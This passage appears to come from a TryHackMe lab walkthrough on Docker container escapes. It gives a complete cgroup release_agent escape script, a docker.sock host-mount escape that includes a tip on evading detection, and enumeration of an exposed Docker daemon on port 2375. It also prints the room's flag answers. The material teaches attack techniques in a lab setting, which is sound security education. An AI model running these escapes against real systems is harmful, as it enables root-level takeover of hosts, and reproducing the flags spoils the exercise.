<p>Note how containers #1 and #2 are running in &quot;user/normal&quot; mode, whereas container #3 is running in &quot;privileged&quot; mode. Containers in &quot;user&quot; mode interact with the operating system through the Docker Engine. Privileged containers, however, do not do this. Instead, they bypass the Docker Engine and directly communicate with the operating system.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-does-this-mean-for-us">What Does This Mean for Us<a href="#what-does-this-mean-for-us" class="hash-link" aria-label="Direct link to What Does This Mean for Us" title="Direct link to What Does This Mean for Us" translate="no">​</a></h3>
<p>Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root on the host.</p>
<p>We can use a utility such as <code>capsh</code> which comes with the libcap2-bin package to list the capabilities our container has: <code>capsh --print</code> . Capabilities are used in Linux to assign specific permissions to a process. Listing the capabilities of the container is a good way to determine the syscalls that can be made and potential mechanisms for exploitation.</p>
<p>Some capabilities of interest have been provided in the terminal snippet below.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing capabilities of a privileged Docker Container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@privilegedcontainer:~$ capsh </span><span class="token parameter variable" style="color:#36acaa">--print</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Current: </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid</span><br></span></code></pre></div></div>
<p>In the example exploit below, we are going to use the mount syscall (as allowed by the container&#x27;s capabilities) to mount the host&#x27;s control groups into the container.</p>
<p>The code snippet below is based upon (but a modified) version of the <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so." target="_blank" rel="noopener noreferrer" class="">Proof of Concept (PoC) created by Trailofbits</a>, which details the inner workings of this exploit well.</p>
<hr>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/cgrp </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> cgroup </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> rdma cgroup /tmp/cgrp </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/cgrp/x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/cgrp/x/notify_on_release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain">. </span><span class="token assign-left variable" style="color:#36acaa">host_path</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable function" style="color:#d73a49">sed</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-n</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span><span class="token variable" style="color:#36acaa"> /etc/mtab</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$host_path</span><span class="token string" style="color:#e3116c">/exploit&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/cgrp/release_agent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;#!/bin/sh&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;cat /home/cmnatic/flag.txt &gt; </span><span class="token string variable" style="color:#36acaa">$host_path</span><span class="token string" style="color:#e3116c">/flag.txt&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> a+x /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">sh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span><br></span></code></pre></div></div>
<p>Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.</p>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="explaining-the-vulnerability">Explaining the Vulnerability<a href="#explaining-the-vulnerability" class="hash-link" aria-label="Direct link to Explaining the Vulnerability" title="Direct link to Explaining the Vulnerability" translate="no">​</a></h3>
<ol>
<li class="">We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses &quot;cgroups&quot; to manage processes on the operating system. Since we can manage &quot;cgroups&quot; as root on the host, we&#x27;ll mount this to &quot;/tmp/cgrp&quot; on the container.</li>
<li class="">For our exploit to execute, we&#x27;ll need to tell the kernel to run our code. By adding &quot;1&quot; to &quot;/tmp/cgrp/x/notify_on_release&quot;, we&#x27;re telling the kernel to execute something once the &quot;cgroup&quot; finishes. (<a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank" rel="noopener noreferrer" class="">Paul Menage., 2004</a>).</li>
<li class="">We find out where the container&#x27;s files are stored on the host and store it as a variable.</li>
<li class="">We then echo the location of the container&#x27;s files into our &quot;/exploit&quot; and then ultimately to the &quot;release_agent&quot; which is what will be executed by the &quot;cgroup&quot; once it is released.</li>
<li class="">Let&#x27;s turn our exploit into a shell on the host</li>
<li class="">Execute a command to echo the host flag into a file named &quot;flag.txt&quot; in the container once &quot;/exploit&quot; is executed.</li>
<li class="">Make our exploit executable!</li>
<li class="">We create a process and store that into &quot;/tmp/cgrp/x/cgroup.procs&quot;. When the processs is released, the contents will be executed.</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Perform the exploit in this task on the target machine. <strong>What is the value of the flag that has now been added to the container?</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{MOUNT_MADNESS}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-4-vulnerability-2-escaping-via-exposed-docker-daemon">Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon<a href="#task-4-vulnerability-2-escaping-via-exposed-docker-daemon" class="hash-link" aria-label="Direct link to Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon" title="Direct link to Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="unix-sockets-101-one-size-fits-all">Unix Sockets 101 (One Size Fits All)<a href="#unix-sockets-101-one-size-fits-all" class="hash-link" aria-label="Direct link to Unix Sockets 101 (One Size Fits All)" title="Direct link to Unix Sockets 101 (One Size Fits All)" translate="no">​</a></h3>
<p>When mentioning &quot;sockets&quot;, you would likely think of &quot;sockets&quot; in networking. Well, the concept here is almost the same. Sockets are used to move data between two places. Unix sockets use the filesystem to transfer data rather than networking interfaces. This is known as Inter-process Communication (IPC) and is essential in operating systems because being able to send data between processes is extremely important.</p>
<p>Unix sockets are substantially quicker at transferring data than TCP/IP sockets (<a href="https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/" target="_blank" rel="noopener noreferrer" class="">Percona., 2020</a>). This is why database technologies such as <a href="https://redis.io/" target="_blank" rel="noopener noreferrer" class="">Redis</a> boast such outstanding performance. Unix sockets also use file system permissions. This is important to remember for the next heading.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-does-docker-use-sockets">How Does Docker Use Sockets<a href="#how-does-docker-use-sockets" class="hash-link" aria-label="Direct link to How Does Docker Use Sockets" title="Direct link to How Does Docker Use Sockets" translate="no">​</a></h3>
<p>When interacting with the Docker Engine (i.e. running commands such as <code>docker run</code>), this will be done using a socket (usually, this is done using a Unix socket unless you execute the commands to a remote Docker host). Recall that Unix sockets use filesystem permissions. This is why you must be a member of the Docker group (or root!) to run Docker commands, as you will need the permissions to access the socket owned by Docker.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Verifying that our user is a part of the Docker group</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@demo-container:~$ </span><span class="token function" style="color:#d73a49">groups</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="finding-the-docker-socket-in-a-container">Finding the Docker Socket in a Container<a href="#finding-the-docker-socket-in-a-container" class="hash-link" aria-label="Direct link to Finding the Docker Socket in a Container" title="Direct link to Finding the Docker Socket in a Container" translate="no">​</a></h3>
<p>Remember, containers interact with the host operating system using the Docker Engine (and, therefore, have access to the Docker socket!) This socket (named docker.sock) will be mounted in the container. The location of this varies by the operating system the container is running, so you would want to <code>find</code> it. However, in this example, the container runs Ubuntu 18.04, meaning the docker.sock is located in <code>/var/run</code>.</p>
<p><strong>Note</strong>: This location can vary based on the operating system and can even be manually set by the developer at runtime of the container.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Finding the docker.sock file in a container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@demo-container:~$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-la</span><span class="token plain"> /var/run </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> sock</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">srw-rw---- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Dec </span><span class="token number" style="color:#36acaa">9</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:37 docker.sock</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploiting-the-docker-socket-in-a-container">Exploiting the Docker Socket in a Container<a href="#exploiting-the-docker-socket-in-a-container" class="hash-link" aria-label="Direct link to Exploiting the Docker Socket in a Container" title="Direct link to Exploiting the Docker Socket in a Container" translate="no">​</a></h3>
<p>First, let&#x27;s confirm we can execute docker commands. You will either need to be root on the container or have the &quot;docker&quot; group permissions as a lower-privileged user.</p>
<p>Let&#x27;s break down the vulnerability here:</p>
<hr>
<p>We will use Docker to create a new container and mount the host&#x27;s filesystem into this new container. Then we are going to access the new container and look at the host&#x27;s filesystem.</p>
<p>Our final command will look like this: <code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code>, which does the following:</p>
<ol>
<li class="">We will need to upload a docker image. For this room, I have provided this on the VM. It is called &quot;alpine&quot;. The &quot;alpine&quot; distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.</li>
<li class="">We will use <code>docker run</code> to start the new container and mount the host&#x27;s file system (/) to (/mnt) in the new container: <code>docker run -v /:/mnt</code></li>
<li class="">We will tell the container to run interactively (so that we can execute commands in the new container): <code>-it</code></li>
<li class="">Now, we will use the already provided alpine image: <code>alpine</code></li>
<li class="">We will use <code>chroot</code> to change the root directory of the container to be /mnt (where we are mounting the files from the host operating system): <code>chroot /mnt</code></li>
<li class="">Now, we will tell the container to run <code>sh</code> to gain a shell and execute commands in the container: <code>sh</code></li>
</ol>
<p>You may need to &quot;Ctrl + C&quot; to cancel the exploit once or twice for this vulnerability to work, but, as you can see below, we have successfully mounted the host operating system&#x27;s filesystem into the new alpine container.</p>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="verify-success">Verify Success<a href="#verify-success" class="hash-link" aria-label="Direct link to Verify Success" title="Direct link to Verify Success" translate="no">​</a></h3>
<p>After executing the command, we should see that we have been placed into a new container. Remember, we mounted the host&#x27;s filesystem to /mnt (and then used <code>chroot</code> to make the container&#x27;s /mnt become /)</p>
<p>So, let&#x27;s see the contents of /  by doing <code>ls /</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing the contents of / on the new container (which will have the host operating system&#x27;s files)</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@alpine-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ls /</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Name the directory path which contains the docker.sock file on the container. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/var/run</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Perform the exploit in this task on the target machine. <strong>What is the value of the flag located at /root/flag.txt on the host operating system?</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{NEVER-ENOUGH-SOCKS}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon">Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon<a href="#task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon" class="hash-link" aria-label="Direct link to Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon" title="Direct link to Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-docker-engine---tcp-sockets-edition">The Docker Engine - TCP Sockets Edition<a href="#the-docker-engine---tcp-sockets-edition" class="hash-link" aria-label="Direct link to The Docker Engine - TCP Sockets Edition" title="Direct link to The Docker Engine - TCP Sockets Edition" translate="no">​</a></h3>
<p>Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this.</p>
<p>Docker can be remotely administrated. For example, using management tools such as <a href="https://www.portainer.io/" target="_blank" rel="noopener noreferrer" class="">Portainer</a> or <a href="https://www.jenkins.io/" target="_blank" rel="noopener noreferrer" class="">Jenkins</a> to deploy containers to test their code (yay, automation!).</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-vulnerability">The Vulnerability<a href="#the-vulnerability" class="hash-link" aria-label="Direct link to The Vulnerability" title="Direct link to The Vulnerability" translate="no">​</a></h3>
<p>The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="enumerating-finding-out-if-a-device-has-docker-remotely-accessible">Enumerating: Finding Out if a Device Has Docker Remotely Accessible<a href="#enumerating-finding-out-if-a-device-has-docker-remotely-accessible" class="hash-link" aria-label="Direct link to Enumerating: Finding Out if a Device Has Docker Remotely Accessible" title="Direct link to Enumerating: Finding Out if a Device Has Docker Remotely Accessible" translate="no">​</a></h3>
<p>By default, the engine will run on <strong>port 2375</strong>. We can confirm this by performing an Nmap scan against your target (10.80.133.1) from your AttackBox.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Verifying if our target has Docker remotely accessible</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ nmap </span><span class="token parameter variable" style="color:#36acaa">-sV</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2375</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.80</span><span class="token plain">.133.1 Starting Nmap </span><span class="token number" style="color:#36acaa">7.80</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> https://nmap.org </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> at </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">-01-02 </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">:27 GMT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> docker-host </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10.80</span><span class="token plain">.133.1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">.0018s latency</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not shown: </span><span class="token number" style="color:#36acaa">65531</span><span class="token plain"> closed ports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT    STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2375</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> Docker </span><span class="token number" style="color:#36acaa">20.10</span><span class="token plain">.20 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">API </span><span class="token number" style="color:#36acaa">1.41</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Looks like it&#x27;s open; we&#x27;re going to use the <code>curl</code> command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: curl <code>http://MACHINE_IP:2375/version</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">CURLing the Docker Socket</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ </span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> http://10.80.133.1:2375/version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;Platform&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;Name&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Docker Engine - Community&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;Components&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Name&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Engine&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Version&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;20.10.20&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Details&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;ApiVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1.41&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Arch&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;amd64&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;BuildTime&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;2022-10-18T18:18:12.000000000+00:00&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Experimental&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;false&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;GitCommit&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;03df974&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;GoVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;go1.18.7&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;KernelVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;5.15.0-1022-aws&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;MinAPIVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1.12&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Os&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;linux&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="executing-docker-commands-on-our-target">Executing Docker Commands on Our Target<a href="#executing-docker-commands-on-our-target" class="hash-link" aria-label="Direct link to Executing Docker Commands on Our Target" title="Direct link to Executing Docker Commands on Our Target" translate="no">​</a></h3>
<p>For this, we&#x27;ll need to tell our version of Docker to send the command to our target (not our own machine). We can add the &quot;-H&quot; switch to our target. To test if we can run commands, we&#x27;ll list the containers on the target: <code>docker -H tcp://10.80.133.1:2375 ps</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing the containers on our target</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> tcp://10.80.133.1:2375 </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         PORTS                               NAMES</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b4ec8c45414c   dockertest   </span><span class="token string" style="color:#e3116c">&quot;/usr/sbin/sshd -D&quot;</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> hours ago   Up </span><span class="token number" 